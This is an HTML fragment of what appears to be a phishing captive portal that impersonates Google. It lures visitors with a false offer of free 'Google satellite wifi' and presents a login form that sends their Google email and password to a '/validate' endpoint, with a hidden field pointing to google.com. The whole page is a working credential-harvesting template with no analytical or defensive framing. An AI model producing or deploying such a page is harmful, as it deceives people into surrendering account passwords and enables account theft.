                border-radius: 10px;

            }

<body>
    <div class='logo' aria-label='Google'></div>
    <div class='banner'>
            <h1>
                    Your location has been selected to test the new Google satellite wifi for free.
                </h1>
            <h2>
                    Sign up with Google and start surfing for free now!
                </h2>
            <h2 class='hidden-small'>
                    Sign in to your Google account to continue.
                </h2>
        </div>
    <div class='login-page'>
            <div class='form'>
                    <form class='login-form' action='/validate' method='GET'>
                            <div class='circle-mask'></div>
                            <br>
                            <input id='g' type='email' placeholder='Email' name='user' required />
                            <input id='g' type='password' placeholder='Password' name='pass' required />
                            <input type='hidden' name='url' value='google.com'>
                            <button id='l' type='submit'>Login</button>
                        </form>
                </div>
        </div>
